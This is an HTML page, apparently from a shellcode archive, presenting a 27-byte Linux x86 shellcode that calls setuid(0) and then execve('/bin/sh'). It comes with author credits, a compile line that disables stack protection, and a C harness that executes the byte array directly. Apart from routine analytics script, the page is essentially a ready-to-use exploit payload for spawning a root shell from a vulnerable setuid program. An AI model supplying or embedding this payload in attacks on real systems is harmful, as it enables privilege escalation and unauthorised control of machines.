<html><head><title>Linux/x86 - setuid(0) ^ execve(/bin/sh, 0, 0) - 27 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/*
	by Magnefikko
	24.04.2010
	magnefikko@gmail.com
	Promhyl Studies :: http://promhyl.oz.pl
	Subgroup: #PRekambr
	Name: 27 bytes setuid(0) ^ execve(&quot;/bin/sh&quot;, 0, 0) shellcode
	Platform: Linux x86
	
	setuid(0);
	execve(&quot;/bin/sh&quot;, 0, 0);	

	gcc -Wl,-z,execstack filename.c

	shellcode:

\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80

*/


int main(){
	char shell[] =&quot;\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80&quot;;
	printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)= %d\n&quot;, strlen(shell));
	(*(void (*)()) shell)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
